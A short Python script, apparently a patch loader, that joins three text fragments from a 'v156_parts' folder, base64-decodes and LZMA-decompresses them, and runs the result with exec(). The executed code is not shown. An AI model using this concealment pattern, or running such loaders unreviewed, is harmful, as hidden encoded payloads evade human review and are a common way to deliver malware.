from pathlib import Path
import base64, lzma
parts = Path(__file__).with_name('v156_parts')
payload = ''.join((parts / f'part{i:02d}.txt').read_text(encoding='utf-8').strip() for i in range(3))
code = lzma.decompress(base64.b64decode(payload)).decode('utf-8')
exec(compile(code, 'patch_v156_payload.py', 'exec'), globals())
